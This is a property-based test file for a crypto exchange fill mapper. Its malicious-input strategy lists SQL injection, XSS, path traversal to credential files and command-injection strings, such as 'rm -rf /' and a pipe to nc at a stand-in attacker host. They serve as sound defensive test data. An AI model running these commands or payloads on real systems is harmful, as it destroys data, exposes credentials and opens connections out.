"""CyberDeltaEngine: Backpack Account Data Mapper Edge Cases Tests with Property-Based Testing.

---------------------------------------------------------------

Comprehensive property-based test suite for BackpackTransactionMapper edge cases and robustness.
Tests boundary conditions, unicode handling, and extreme value scenarios including:
- Boundary decimal value testing
- Zero value handling
- Unicode symbol support
- Very long ID handling
- Error recovery scenarios
- Malicious input resistance
- Scientific notation handling
- Whitespace handling
"""

from decimal import Decimal, InvalidOperation
from typing import Any
from unittest.mock import patch

import pytest
from hypothesis import given, strategies as st, assume, settings
from hypothesis.strategies import SearchStrategy, composite

from cyberdelta.apis.backpack.mappers.account.bp_transaction_mapper import BackpackTransactionMapper
from cyberdelta.apis.backpack.models.bp_raw_fills import BackpackRawFillResponse
from cyberdelta.apis.common import TransformationError
from cyberdelta.symbols import exchanges


pytestmark = pytest.mark.timing


# =======================
# Strategy Builders
# =======================


def valid_side_strategy() -> SearchStrategy[str]:
    """Generate valid side values for Backpack fills.

    Returns:
        SearchStrategy[str]: Strategy for valid order sides.
    """
    return st.sampled_from(["Ask", "Bid"])


def extreme_decimal_strategy() -> SearchStrategy[str]:
    """Generate extreme decimal values as strings.

    Returns:
        SearchStrategy[str]: Strategy for extreme decimal strings.
    """
    return st.one_of([
        # Very small values
        st.sampled_from(["0.000000001", "0.00000001", "0.0000001"]),
        # Very large values
        st.sampled_from(["999999999", "999999999.999999", "1000000000"]),
        # High precision values
        st.builds(
            lambda integer, fraction: f"{integer}.{''.join(fraction)}",
            st.integers(min_value=1, max_value=999),
            st.lists(st.sampled_from("0123456789"), min_size=10, max_size=30),
        ),
        # Scientific notation
        st.builds(
            lambda mantissa, exponent: f"{mantissa}e{exponent}",
            st.floats(min_value=1.0, max_value=9.9, allow_nan=False, allow_infinity=False),
            st.integers(min_value=-10, max_value=10),
        ),
    ])


def zero_value_strategy() -> SearchStrategy[str]:
    """Generate various representations of zero.

    Returns:
        SearchStrategy[str]: Strategy for zero value strings.
    """
    return st.sampled_from([
        "0",
        "0.0",
        "0.00",
        "0.000",
        "0.0000",
        "0.00000000",
        "0.000000000000",
        "0e0",
        "0.0e0",
        "0E0",
        "0.0E+0",
    ])


def unicode_symbol_strategy() -> SearchStrategy[str]:
    """Generate symbols with unicode characters.

    Returns:
        SearchStrategy[str]: Strategy for unicode-containing symbols.
    """
    return st.one_of([
        # Emoji in symbols
        st.builds(
            lambda base, emoji: f"{base}-USDC{emoji}",
            st.sampled_from(["BTC", "ETH", "SOL", "DOGE"]),
            st.sampled_from(["🚀", "💎", "🌙", "📈", "💰"]),
        ),
        # Chinese characters
        st.builds(
            lambda base: f"{base}-测试",
            st.sampled_from(["BTC", "ETH", "SOL"]),
        ),
        # Cyrillic characters
        st.builds(
            lambda base: f"{base}-тест",
            st.sampled_from(["BTC", "ETH", "SOL"]),
        ),
        # Greek characters
        st.builds(
            lambda base: f"{base}-αβγ",
            st.sampled_from(["BTC", "ETH", "SOL"]),
        ),
        # Arabic characters
        st.builds(
            lambda base: f"{base}-العربية",
            st.sampled_from(["BTC", "ETH", "SOL"]),
        ),
        # Mixed unicode
        st.builds(
            lambda a, b, c: f"{a}{b}{c}",
            st.sampled_from(["BTC", "ETH", "SOL"]),
            st.sampled_from(["-", "_", "/"]),
            st.text(
                alphabet=st.characters(min_codepoint=0x1F300, max_codepoint=0x1F6FF),
                min_size=1,
                max_size=5,
            ),
        ),
    ])


def special_char_symbol_strategy() -> SearchStrategy[str]:
    """Generate symbols with special characters.

    Returns:
        SearchStrategy[str]: Strategy for symbols with special characters.
    """
    return st.one_of([
        # Forward slash
        st.builds(
            lambda base, quote: f"{base}/{quote}",
            st.sampled_from(["BTC", "ETH", "SOL"]),
            st.sampled_from(["USDC", "USDT", "USD"]),
        ),
        # Dot notation
        st.builds(lambda base: f"{base}-USDC.PERP", st.sampled_from(["BTC", "ETH", "SOL"])),
        # Underscore
        st.builds(lambda base: f"{base}_USDC_FUT", st.sampled_from(["BTC", "ETH", "SOL"])),
        # At symbol
        st.builds(
            lambda base, period: f"{base}-USDC@{period}",
            st.sampled_from(["BTC", "ETH", "SOL"]),
            st.sampled_from(["1M", "3M", "6M", "1Y"]),
        ),
        # Hash symbol
        st.builds(
            lambda base, type_: f"{base}-USDC#{type_}",
            st.sampled_from(["BTC", "ETH", "SOL"]),
            st.sampled_from(["SPOT", "PERP", "FUT"]),
        ),
    ])


def whitespace_value_strategy() -> SearchStrategy[str]:
    """Generate numeric values with various whitespace patterns.

    Returns:
        SearchStrategy[str]: Strategy for values with whitespace.
    """
    return st.builds(
        lambda prefix, value, suffix: f"{prefix}{value}{suffix}",
        st.sampled_from(["", " ", "  ", "\t", "\n", "\r\n"]),
        st.sampled_from(["100.50", "10.0", "0.05", "999.999"]),
        st.sampled_from(["", " ", "  ", "\t", "\n", "\r\n"]),
    )


def long_id_strategy() -> SearchStrategy[str]:
    """Generate very long ID strings.

    Returns:
        SearchStrategy[str]: Strategy for long ID strings.
    """
    return st.one_of([
        # Just within limits
        st.text(
            alphabet=st.characters(whitelist_categories=["Ll", "Lu", "Nd"]),
            min_size=60,
            max_size=64,
        ),
        # Over the limit
        st.text(
            alphabet=st.characters(whitelist_categories=["Ll", "Lu", "Nd"]),
            min_size=65,
            max_size=200,
        ),
        # Extremely long
        st.text(
            alphabet=st.characters(whitelist_categories=["Ll", "Lu", "Nd"]),
            min_size=1000,
            max_size=2000,
        ),
    ])


def malicious_input_strategy() -> SearchStrategy[str]:
    """Generate potentially malicious input strings.

    Returns:
        SearchStrategy[str]: Strategy for malicious inputs.
    """
    return st.one_of([
        # SQL injection attempts
        st.sampled_from([
            "'; DROP TABLE fills; --",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM orders WHERE 1=1; --",
        ]),
        # XSS attempts
        st.sampled_from([
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'></iframe>",
        ]),
        # Command injection
        st.sampled_from([
            "$(rm -rf /)",
            "`cat /etc/passwd`",
            "; ls -la",
            "| nc attacker.com 1234",
        ]),
        # Path traversal
        st.sampled_from([
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "file:///etc/passwd",
        ]),
        # Buffer overflow attempts
        st.text(alphabet="A", min_size=1000, max_size=1500),
        # Format string attacks
        st.sampled_from(["%s%s%s%s%s", "%x%x%x%x", "%n%n%n%n"]),
        # Null bytes
        st.builds(lambda prefix: f"{prefix}\x00injected", st.text(min_size=1, max_size=10)),
    ])


@composite
def valid_raw_fill_strategy(draw: Any) -> BackpackRawFillResponse:
    """Generate valid BackpackRawFillResponse instances.

    Args:
        draw: Hypothesis draw function.

    Returns:
        BackpackRawFillResponse: Valid fill response for testing.
    """
    return BackpackRawFillResponse(
        fee=draw(st.sampled_from(["0.05", "0.01", "0.001", "0.1"])),
        feeSymbol=draw(st.sampled_from(["USDC", "USDT", "USD", "BTC", "ETH"])),
        isMaker=draw(st.booleans()),
        orderId=draw(st.text(min_size=1, max_size=50)),
        price=draw(st.sampled_from(["100.50", "50.25", "1000.00", "0.01"])),
        quantity=draw(st.sampled_from(["10.0", "1.0", "100.0", "0.1"])),
        side=draw(valid_side_strategy()),
        symbol=draw(st.sampled_from(["BTC-USDC", "ETH-USDC", "SOL-USDC"])),
        timestamp=draw(st.sampled_from(["2024-01-15T10:30:00Z", "2024-12-31T23:59:59Z"])),
        tradeId=draw(st.integers(min_value=1, max_value=999999999)),
        clientId=draw(st.one_of(st.none(), st.text(min_size=1, max_size=50))),
        systemOrderType=draw(st.none()),
    )


@composite
def extreme_raw_fill_strategy(draw: Any) -> BackpackRawFillResponse:
    """Generate BackpackRawFillResponse with extreme values.

    Args:
        draw: Hypothesis draw function.

    Returns:
        BackpackRawFillResponse: Fill response with extreme values.
    """
    return BackpackRawFillResponse(
        fee=draw(extreme_decimal_strategy()),
        feeSymbol=draw(st.text(min_size=1, max_size=10)),
        isMaker=draw(st.booleans()),
        orderId=draw(st.text(min_size=1, max_size=100)),
        price=draw(extreme_decimal_strategy()),
        quantity=draw(extreme_decimal_strategy()),
        side=draw(valid_side_strategy()),
        symbol=draw(st.text(min_size=3, max_size=50)),
        timestamp="2024-01-15T10:30:00Z",
        tradeId=draw(st.integers(min_value=1, max_value=10**18)),
        clientId=draw(st.one_of(st.none(), st.text(min_size=0, max_size=200))),
        systemOrderType=None,
    )


# =======================
# Fixtures
# =======================


@pytest.fixture
def mapper() -> BackpackTransactionMapper:
    """Fixture providing a BackpackTransactionMapper instance.

    Returns:
        BackpackTransactionMapper: Configured mapper instance for testing.
    """
    return BackpackTransactionMapper()


# =======================
# Property-Based Tests
# =======================


class TestBoundaryValues:
    """Property-based tests for boundary value handling."""

    @given(
        price=extreme_decimal_strategy(),
        quantity=extreme_decimal_strategy(),
        fee=extreme_decimal_strategy(),
    )
    @settings(max_examples=50)
    def test_extreme_decimal_values(
        self,
        mapper: BackpackTransactionMapper,
        price: str,
        quantity: str,
        fee: str,
    ) -> None:
        """Test handling of extreme decimal values."""
        raw_fill = BackpackRawFillResponse(
            fee=fee,
            feeSymbol="USDC",
            isMaker=True,
            orderId="order123",
            price=price,
            quantity=quantity,
            side="Bid",
            symbol="SOL-USDC",
            timestamp="2024-01-15T10:30:00Z",
            tradeId=123456,
            clientId=None,
            systemOrderType=None,
        )

        try:
            result = mapper.transform_raw_fill_to_internal(raw_fill)

            if result is not None:
                # Verify decimal conversion worked
                assert isinstance(result.price, Decimal)
                assert isinstance(result.quantity, Decimal)
                assert isinstance(result.fee, Decimal)

                # Check for positive values
                assert result.price > 0
                assert result.quantity > 0
                assert result.fee >= 0
        except (TransformationError, ValueError, InvalidOperation):
            # Some extreme values might fail parsing, which is acceptable
            pass

    @given(
        zero_price=zero_value_strategy(),
        zero_quantity=zero_value_strategy(),
        zero_fee=zero_value_strategy(),
    )
    def test_zero_value_handling(
        self,
        mapper: BackpackTransactionMapper,
        zero_price: str,
        zero_quantity: str,
        zero_fee: str,
    ) -> None:
        """Test handling of various zero representations."""
        # Test zero price
        raw_fill = BackpackRawFillResponse(
            fee="0.05",
            feeSymbol="USDC",
            isMaker=True,
            orderId="order123",
            price=zero_price,
            quantity="10.0",
            side="Bid",
            symbol="SOL-USDC",
            timestamp="2024-01-15T10:30:00Z",
            tradeId=123456,
            clientId=None,
            systemOrderType=None,
        )

        result = mapper.transform_raw_fill_to_internal(raw_fill)
        assert result is None, "Should return None for zero price"

        # Test zero quantity
        raw_fill.price = "100.50"
        raw_fill.quantity = zero_quantity

        result = mapper.transform_raw_fill_to_internal(raw_fill)
        assert result is None, "Should return None for zero quantity"

        # Test zero fee (should be valid)
        raw_fill.quantity = "10.0"
        raw_fill.fee = zero_fee

        result = mapper.transform_raw_fill_to_internal(raw_fill)
        assert result is not None, "Should handle zero fee"
        assert result.fee == Decimal("0")


class TestUnicodeHandling:
    """Property-based tests for unicode character handling."""

    @given(symbol=unicode_symbol_strategy())
    @settings(max_examples=30)
    def test_unicode_symbols(
        self,
        mapper: BackpackTransactionMapper,
        symbol: str,
    ) -> None:
        """Test handling of unicode characters in symbols."""
        raw_fill = BackpackRawFillResponse(
            fee="0.05",
            feeSymbol="USDC",
            isMaker=True,
            orderId="order123",
            price="100.50",
            quantity="10.0",
            side="Bid",
            symbol=symbol,
            timestamp="2024-01-15T10:30:00Z",
            tradeId=123456,
            clientId=None,
            systemOrderType=None,
        )

        result = mapper.transform_raw_fill_to_internal(raw_fill)

        if result is not None:
            assert result.symbol == exchanges.backpack(symbol)
            assert isinstance(result.symbol.value, str)

    @given(
        fee_symbol=st.one_of(
            st.text(
                alphabet=st.characters(min_codepoint=0x1F300, max_codepoint=0x1F6FF),
                min_size=1,
                max_size=10,
            ),
            st.text(alphabet="测试тестαβγالعربية", min_size=1, max_size=10),
        )
    )
    @settings(max_examples=20)
    def test_unicode_fee_symbols(
        self,
        mapper: BackpackTransactionMapper,
        fee_symbol: str,
    ) -> None:
        """Test handling of unicode characters in fee symbols."""
        raw_fill = BackpackRawFillResponse(
            fee="0.05",
            feeSymbol=fee_symbol,
            isMaker=True,
            orderId="order123",
            price="100.50",
            quantity="10.0",
            side="Bid",
            symbol="SOL-USDC",
            timestamp="2024-01-15T10:30:00Z",
            tradeId=123456,
            clientId=None,
            systemOrderType=None,
        )

        result = mapper.transform_raw_fill_to_internal(raw_fill)

        if result is not None:
            assert result.fee_asset == fee_symbol


class TestSpecialCharacters:
    """Property-based tests for special character handling."""

    @given(symbol=special_char_symbol_strategy())
    @settings(max_examples=30)
    def test_special_char_symbols(
        self,
        mapper: BackpackTransactionMapper,
        symbol: str,
    ) -> None:
        """Test handling of special characters in symbols."""
        raw_fill = BackpackRawFillResponse(
            fee="0.05",
            feeSymbol="USDC",
            isMaker=True,
            orderId="order123",
            price="100.50",
            quantity="10.0",
            side="Bid",
            symbol=symbol,
            timestamp="2024-01-15T10:30:00Z",
            tradeId=123456,
            clientId=None,
            systemOrderType=None,
        )

        result = mapper.transform_raw_fill_to_internal(raw_fill)

        if result is not None:
            assert result.symbol == exchanges.backpack(symbol)


class TestWhitespaceHandling:
    """Property-based tests for whitespace handling."""

    @given(
        price=whitespace_value_strategy(),
        quantity=whitespace_value_strategy(),
        fee=whitespace_value_strategy(),
    )
    @settings(max_examples=30)
    def test_whitespace_in_values(
        self,
        mapper: BackpackTransactionMapper,
        price: str,
        quantity: str,
        fee: str,
    ) -> None:
        """Test handling of whitespace in numeric values."""
        raw_fill = BackpackRawFillResponse(
            fee=fee,
            feeSymbol="USDC",
            isMaker=True,
            orderId="order123",
            price=price,
            quantity=quantity,
            side="Bid",
            symbol="SOL-USDC",
            timestamp="2024-01-15T10:30:00Z",
            tradeId=123456,
            clientId=None,
            systemOrderType=None,
        )

        result = mapper.transform_raw_fill_to_internal(raw_fill)

        if result is not None:
            # Values should be parsed correctly despite whitespace
            assert isinstance(result.price, Decimal)
            assert isinstance(result.quantity, Decimal)
            assert isinstance(result.fee, Decimal)
            assert result.price > 0
            assert result.quantity > 0


class TestLongIds:
    """Property-based tests for long ID handling."""

    @given(
        order_id=long_id_strategy(),
        client_id=long_id_strategy(),
    )
    @settings(max_examples=20)
    def test_long_id_handling(
        self,
        mapper: BackpackTransactionMapper,
        order_id: str,
        client_id: str,
    ) -> None:
        """Test handling of very long ID values."""
        raw_fill = BackpackRawFillResponse(
            fee="0.05",
            feeSymbol="USDC",
            isMaker=True,
            orderId=order_id,
            price="100.50",
            quantity="10.0",
            side="Bid",
            symbol="SOL-USDC",
            timestamp="2024-01-15T10:30:00Z",
            tradeId=123456,
            clientId=client_id,
            systemOrderType=None,
        )

        if len(client_id) > 64:
            # Should raise error for client_id over 64 chars
            with pytest.raises(TransformationError):
                mapper.transform_raw_fill_to_internal(raw_fill)
        else:
            result = mapper.transform_raw_fill_to_internal(raw_fill)
            if result is not None:
                assert result.order_id == order_id
                assert result.client_order_id == client_id


class TestScientificNotation:
    """Property-based tests for scientific notation handling."""

    @given(
        mantissa=st.floats(min_value=1.0, max_value=9.99, allow_nan=False, allow_infinity=False),
        exponent=st.integers(min_value=-10, max_value=10),
    )
    @settings(max_examples=30)
    def test_scientific_notation(
        self,
        mapper: BackpackTransactionMapper,
        mantissa: float,
        exponent: int,
    ) -> None:
        """Test handling of scientific notation in numeric fields."""
        sci_value = f"{mantissa}e{exponent}"

        raw_fill = BackpackRawFillResponse(
            fee="0.05",
            feeSymbol="USDC",
            isMaker=True,
            orderId="order123",
            price=sci_value,
            quantity="10.0",
            side="Bid",
            symbol="SOL-USDC",
            timestamp="2024-01-15T10:30:00Z",
            tradeId=123456,
            clientId=None,
            systemOrderType=None,
        )

        try:
            result = mapper.transform_raw_fill_to_internal(raw_fill)

            if result is not None:
                expected = Decimal(mantissa) * (Decimal("10") ** exponent)
                if expected > 0:
                    assert abs(result.price - expected) < Decimal("1e-10")
                else:
                    assert result is None
        except (ValueError, InvalidOperation):
            # Some scientific notation might not parse, which is acceptable
            pass


class TestLargeNumbers:
    """Property-based tests for large number handling."""

    @given(trade_id=st.integers(min_value=1, max_value=10**18))
    @settings(max_examples=30)
    def test_large_trade_ids(
        self,
        mapper: BackpackTransactionMapper,
        trade_id: int,
    ) -> None:
        """Test handling of large trade ID values."""
        raw_fill = BackpackRawFillResponse(
            fee="0.05",
            feeSymbol="USDC",
            isMaker=True,
            orderId="order123",
            price="100.50",
            quantity="10.0",
            side="Bid",
            symbol="SOL-USDC",
            timestamp="2024-01-15T10:30:00Z",
            tradeId=trade_id,
            clientId=None,
            systemOrderType=None,
        )

        result = mapper.transform_raw_fill_to_internal(raw_fill)

        if result is not None:
            assert result.id == str(trade_id)
            assert int(result.id) == trade_id


class TestMaliciousInputs:
    """Property-based tests for malicious input resistance."""

    @given(malicious=malicious_input_strategy())
    @settings(max_examples=30)
    def test_malicious_symbol_resistance(
        self,
        mapper: BackpackTransactionMapper,
        malicious: str,
    ) -> None:
        """Test resistance to malicious input in symbols."""
        raw_fill = BackpackRawFillResponse(
            fee="0.05",
            feeSymbol="USDC",
            isMaker=True,
            orderId="order123",
            price="100.50",
            quantity="10.0",
            side="Bid",
            symbol=malicious,
            timestamp="2024-01-15T10:30:00Z",
            tradeId=123456,
            clientId=None,
            systemOrderType=None,
        )

        # Should handle malicious input safely
        try:
            result = mapper.transform_raw_fill_to_internal(raw_fill)
            if result is not None:
                # Verify no code execution or injection occurred
                assert isinstance(result.symbol.value, str)
                # The symbol should be the malicious string, safely stored
                assert result.symbol == exchanges.backpack(malicious)
        except (TransformationError, ValueError):
            # Rejecting malicious input is also acceptable
            pass

    @given(malicious=malicious_input_strategy())
    @settings(max_examples=20)
    def test_malicious_numeric_resistance(
        self,
        mapper: BackpackTransactionMapper,
        malicious: str,
    ) -> None:
        """Test resistance to malicious input in numeric fields."""
        raw_fill = BackpackRawFillResponse(
            fee=malicious,
            feeSymbol="USDC",
            isMaker=True,
            orderId="order123",
            price=malicious,
            quantity=malicious,
            side="Bid",
            symbol="SOL-USDC",
            timestamp="2024-01-15T10:30:00Z",
            tradeId=123456,
            clientId=None,
            systemOrderType=None,
        )

        # Should handle malicious input safely
        try:
            result = mapper.transform_raw_fill_to_internal(raw_fill)
            # Most malicious strings should fail decimal parsing
            assert result is None
        except (TransformationError, ValueError, InvalidOperation):
            # Rejecting malicious input is expected
            pass


class TestErrorHandling:
    """Property-based tests for error handling."""

    @given(raw_fill=valid_raw_fill_strategy())
    def test_decimal_parsing_errors(
        self,
        mapper: BackpackTransactionMapper,
        raw_fill: BackpackRawFillResponse,
    ) -> None:
        """Test error handling during decimal parsing."""
        with patch(
            "cyberdelta.apis.backpack.mappers.account.bp_transaction_mapper.parse_decimal_value",
        ) as mock_parse:
            error = ValueError("Decimal parsing failed")
            mock_parse.side_effect = error

            with pytest.raises(TransformationError) as exc_info:
                mapper.transform_raw_fill_to_internal(raw_fill)

            assert "Failed to transform BackpackRawFillResponse to Trade" in str(exc_info.value)
            assert exc_info.value.__cause__ == error

    @given(raw_fill=valid_raw_fill_strategy())
    def test_timestamp_parsing_errors(
        self,
        mapper: BackpackTransactionMapper,
        raw_fill: BackpackRawFillResponse,
    ) -> None:
        """Test error handling during timestamp parsing."""
        with patch(
            "cyberdelta.apis.backpack.mappers.account.bp_transaction_mapper.parse_datetime_utc",
        ) as mock_parse:
            mock_parse.return_value = None

            result = mapper.transform_raw_fill_to_internal(raw_fill)

            # Should handle malformed timestamps gracefully
            if result is not None:
                assert result.executed_at is not None


class TestCombinedExtreme:
    """Property-based tests combining multiple extreme conditions."""

    @given(raw_fill=extreme_raw_fill_strategy())
    @settings(max_examples=50)
    def test_combined_extreme_values(
        self,
        mapper: BackpackTransactionMapper,
        raw_fill: BackpackRawFillResponse,
    ) -> None:
        """Test handling of fills with multiple extreme values."""
        try:
            result = mapper.transform_raw_fill_to_internal(raw_fill)

            if result is not None:
                # Verify basic invariants hold
                assert isinstance(result.price, Decimal)
                assert isinstance(result.quantity, Decimal)
                assert isinstance(result.fee, Decimal)
                assert result.id == str(raw_fill.trade_id)

                # Check client_id length constraint
                if raw_fill.client_id and len(raw_fill.client_id) > 64:
                    pytest.fail("Should have raised error for long client_id")

        except TransformationError as e:
            # Check that long client_id causes expected error
            if raw_fill.client_id and len(raw_fill.client_id) > 64:
                assert "Failed to transform" in str(e)
            else:
                # Other transformation errors might be valid for extreme inputs
                pass
        except (ValueError, InvalidOperation):
            # Extreme values might fail parsing, which is acceptable
            pass


class TestNegativeValues:
    """Property-based tests for negative value handling."""

    @given(
        negative=st.builds(
            lambda n: f"-{n}",
            st.floats(min_value=0.001, max_value=1000, allow_nan=False, allow_infinity=False),
        )
    )
    def test_negative_value_rejection(
        self,
        mapper: BackpackTransactionMapper,
        negative: str,
    ) -> None:
        """Test that negative values are properly rejected."""
        # Test negative price
        raw_fill = BackpackRawFillResponse(
            fee="0.05",
            feeSymbol="USDC",
            isMaker=True,
            orderId="order123",
            price=negative,
            quantity="10.0",
            side="Bid",
            symbol="SOL-USDC",
            timestamp="2024-01-15T10:30:00Z",
            tradeId=123456,
            clientId=None,
            systemOrderType=None,
        )

        with patch(
            "cyberdelta.apis.backpack.mappers.account.bp_transaction_mapper.parse_decimal_value",
        ) as mock_parse:
            # Allow negative values through parsing to test mapper's handling
            mock_parse.side_effect = lambda v, **kwargs: Decimal(str(v)) if v else None

            result = mapper.transform_raw_fill_to_internal(raw_fill)
            assert result is None, "Should reject negative price"


class TestLegacyCompatibility:
    """Tests to ensure legacy test cases still work."""

    def test_legacy_boundary_decimals(self, mapper: BackpackTransactionMapper) -> None:
        """Legacy test for boundary decimal values."""
        raw_fill = BackpackRawFillResponse(
            fee="0.000000001",
            feeSymbol="USDC",
            isMaker=True,
            orderId="order123",
            price="0.000001",
            quantity="999999999.999999",
            side="Bid",
            symbol="SOL-USDC",
            timestamp="2024-01-15T10:30:00Z",
            tradeId=123456,
            clientId=None,
            systemOrderType=None,
        )

        result = mapper.transform_raw_fill_to_internal(raw_fill)

        assert result is not None
        assert result.price == Decimal("0.000001")
        assert result.quantity == Decimal("999999999.999999")
        assert result.fee == Decimal("0.000000001")

    def test_legacy_mixed_case_sides(self, mapper: BackpackTransactionMapper) -> None:
        """Legacy test for mixed case side values."""
        for side in ["Ask", "Bid"]:
            raw_fill = BackpackRawFillResponse(
                fee="0.05",
                feeSymbol="USDC",
                isMaker=True,
                orderId="order123",
                price="100.50",
                quantity="10.0",
                side=side,
                symbol="SOL-USDC",
                timestamp="2024-01-15T10:30:00Z",
                tradeId=123456,
                clientId=None,
                systemOrderType=None,
            )

            result = mapper.transform_raw_fill_to_internal(raw_fill)

            assert result is not None
            assert result.side is not None
